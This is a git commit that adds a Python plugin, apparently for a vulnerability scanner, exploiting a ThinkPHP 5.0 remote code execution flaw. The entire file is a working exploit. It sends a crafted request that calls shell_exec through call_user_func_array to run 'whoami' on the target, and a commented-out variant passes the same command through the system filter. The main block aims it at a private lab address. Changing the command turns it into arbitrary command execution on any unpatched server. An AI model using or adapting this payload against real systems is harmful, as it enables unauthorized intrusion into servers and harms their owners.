743219f308de6402adceede110e2046638f48c07
b4zinga <b4zinga@outlook.com>
2019-01-22 13:44:20 +0800

    Add Thinkphp 5.0 RCE

---
+++ plugins/thinkphp_rce_5.0.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+# coding: utf-8
+# Date  : 2019-01-18 11:52:51
+# Email : b4zinga@outlook.com
+# Func  :
+
+import requests
+
+def run(url):
+    """Thinkphp 5.0 remote code exec"""
+    # vul = "/index.php?s=/Index/\\think\\Request/input&filter=system&data=whoami"
+    vul = "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami"
+    req = requests.get(url + vul)
+    if req.status_code == 200:
+        return "Thinkphp 5.0 RCE Vulnerable\t\twhoami: " + req.text
+    else:
+        return False
+
+
+
+if __name__ == '__main__':
+    print(run("http://192.168.253.133:8080"))
